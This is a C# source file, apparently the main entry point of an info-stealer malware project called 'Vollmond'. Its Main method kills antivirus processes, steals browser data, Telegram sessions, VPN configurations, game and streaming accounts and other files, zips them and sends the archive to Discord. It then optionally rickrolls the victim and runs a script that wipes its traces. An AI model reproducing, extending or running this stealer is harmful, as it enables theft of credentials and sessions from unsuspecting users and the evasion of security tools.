using System.IO.Compression;
using Vollmond.Browsers;
using Vollmond.messengers;
using Vollmond.Minecraft;
using Vollmond.Security_Bypass;
using Vollmond.Streaming_platforms;
using Vollmond.VPN;
using Vollmond.games;

namespace Vollmond
{
    internal static class Program
    {
        public static string zipPath = Path.Combine(Path.GetTempPath(), $"{Environment.UserName}@{Environment.MachineName}.zip");
        /// <summary>
        ///  The main entry point for the application.
        /// </summary>
        [STAThread]
        static void Main()
        {
            try
            {
                Directory.CreateDirectory(Path.Combine(Path.GetTempPath(), "Grabed_Data"));

                KillAllAntiviruses.KillAntiviruses(); // Killing antiviruses processes while stealer working

                // Stealing data
                StealAllBrowsers.stealAllBrowsers();
                StealTelegram.StealSession();
                UTorrent.StealCurrentTorrents();
                GrabPotentiallyImportantFiles.grabPotentiallyImportantFiles();
                ProtonVPN.StealConnectionConfig(); // Makes a directory "VPN" (Nota Bene)
                Tlauncher.Steal(); // Makes a directory "Minecraft" (Nota bene)
                Spotify.Steal();
                Steam.Steal(); // Makes a directory "games" (Nota bene)


                // Time to complete processes
                Thread.Sleep(2000);

                // Creating archive
                try
                {
                    ZipFile.CreateFromDirectory(
                        Path.Combine(Path.GetTempPath(), "Grabed_Data"),
                        zipPath,
                        CompressionLevel.Optimal,
                        false
                    );
                }
                catch { }

                // Sending archive
                try
                {
                    Thread sendThread = new Thread(() => SendToDiscord.Send());
                    sendThread.Start();
                    sendThread.Join();
                }
                catch { }

                if (URLs.is_need_rickroll == true)
                {
                    Auxiliary.play_rick.Start();
                    MessageBox.Show("U are rickrolled muhaha", "Rick Astley",
                        MessageBoxButtons.OK, MessageBoxIcon.Information, MessageBoxDefaultButton.Button1, MessageBoxOptions.ServiceNotification);
                }
            }
            finally
            {
                // Removing files after user tap any button in messageBox
                try
                {
                    Clear_Traces.Clear_traces(); // Bat script what delete all traces and delete himself when ending work
                }
                catch { }
            }
        }
    }
}